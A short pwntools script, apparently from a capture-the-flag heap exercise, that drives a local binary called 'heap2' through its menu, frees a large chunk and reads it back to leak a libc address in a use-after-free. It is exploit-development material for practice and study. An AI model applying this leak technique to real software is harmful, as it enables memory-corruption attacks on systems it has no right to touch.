from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'split', '-h']

ru = lambda p, x        : p.recvuntil(x)
sn = lambda p, x        : p.send(x)
rl = lambda p           : p.recvline()
sl = lambda p, x        : p.sendline(x)
rv = lambda p, x=1024   : p.recv(numb = x)
sa = lambda p, a, b     : p.sendafter(a,b)
sla = lambda p, a, b    : p.sendlineafter(a,b)
rr = lambda p, t        : p.recvrepeat(t)
rd = lambda p, x        : p.recvuntil(x, drop=True)

io = gdb.debug(['./heap2'], "b 43\nc")

def choice(p, idx):
    sla(p, "choice : ", str(idx))

def add(p, idx, size):
    choice(p, 1)
    sla(p, "idx plz : ", str(idx))
    sla(p, "size plz : ", str(size))

def rm(p, idx):
    choice(p, 2)
    sla(p, "idx plz : ", str(idx))

def show(p, idx):
    choice(p, 3)
    sla(p, "idx plz : ", str(idx))


add(io, 0, 0x500)
add(io, 1, 0x10)
rm(io, 0)
show(io, 0)

libc_addr = u64(rv(io, 6)+'\0\0')

print("libc_addr : " + hex(libc_addr))

io.interactive()